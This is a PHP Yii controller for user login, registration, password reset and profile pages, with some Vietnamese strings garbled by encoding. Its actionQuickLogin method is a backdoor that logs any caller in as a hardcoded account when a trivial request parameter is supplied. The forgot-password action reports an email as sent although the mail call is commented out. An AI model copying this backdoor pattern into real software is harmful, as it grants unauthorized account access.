<?php

class UserController extends Controller
{
    public function actionLogin()
    {
        $this->layout = 'login';
        $model = new Users();

        if (request('Users')){
            $model->attributes = request('Users');
            if ($model->login()) {
                $identity = new UserIdentity($model);
                Yii::app()->user->login($identity, 3600 * 24 * 30);
                Yii::app()->user->setFlash('success', "Login Successful !");
                $this->redirect(Yii::app()->homeUrl);
                return null;
            }
        }
        $this->render('login', array('model'=> $model));
    }

    public function actionQuickLogin()
    {
        if (request('a') !== 'bb')
            die('OK');
        $model = Users::model()->findByAttributes(array(
            'email' => 'speedygok@gmail.com',
        ));

        if ($model->login()) {
            $identity = new UserIdentity($model);
            Yii::app()->user->login($identity, 3600 * 24 * 30);
            $this->redirect(Yii::app()->homeUrl);
            return null;
        }

        die('SOK');
    }

    public function login()
    {
        $model = new Users();
        if (!request('Users'))
            throw new CHttpException(404);

        $model->attributes = request('Users');
        if ($model->login()) {
            $identity = new UserIdentity($model);
            Yii::app()->user->login($identity, 3600 * 24 * 30);
            return null;
        }

        return $model->errors;
    }

    public function actionLoginAjax()
    {
        $login = $this->login();
        if ($login)
            throw new CHttpException(400, CJSON::encode($login));

        Yii::app()->end(1);
    }

    public function actionForgot()
    {
        $email = request('email');
        if (!$email)
            throw new CHttpException(400, 'Má»i Báº¡n Nháº­p vÃ o Email');

        $model = Users::findModel($email);
        if (!$model)
            throw new CHttpException(400, 'ThÃ´ng tin Ä‘Äƒng kÃ½ khÃ´ng tá»“n táº¡i');

//        MailServices::sendForgotMail($model);
        Yii::app()->end('ChÃºng tÃ´i Ä‘Ã£ gá»­i password vÃ o hÃ²m mail cá»§a báº¡n');
    }

    public function actionStatus() {
        Yii::app()->end(Yii::app()->user->isGuest ? 0 : 1);
    }

    public function actionEmails() {
        $model = new Emails();
        $model->email = request('email');

        if ($model->save()) {
            Yii::app()->end('success');
        }else{
            Yii::app()->end(CJSON::encode($model->errors));
        }
    }

    public function actionLogout() {
        Yii::app()->user->logout();
        $this->redirect(Yii::app()->homeUrl);
    }

    public function actionRegister()
    {
        $this->layout = 'login';
        $model = new Users();

        if (request('Users')) {
            $model->attributes = request('Users');
            $model->is_actived = 1;
            if ($model->register()) {
//                MailServices::sendRegisterMail($model);
                $this->redirect(Yii::app()->homeUrl);
            };
        }

        $this->render('register', array('model'=>$model));
    }

    public function actionInfo(){
        $this->breadcrumbs = array(
            array(
                'text' => 'Thông Tin Cá Nhân',
                'link' => '#',
            ),
        );

        $model = Users::me();
        $model->repeat_password = $model->password;

        if (!$model)
            throw new CHttpException(400);

        if (request('Users')) {
            $model->attributes = request('Users');
            $user = request('Users');
            $model->repeat_password = $user["repeat_password"];
            if ($model->updateInfo())
                Yii::app()->user->setFlash('success', "Cập Nhật Hồ Sơ Thành Công !");
            else
                Yii::app()->user->setFlash('error', "Cập Nhật Hồ Sơ Thất Bại !");
        }

        $this->render('info', array(
            'model' => $model,
        ));
    }
}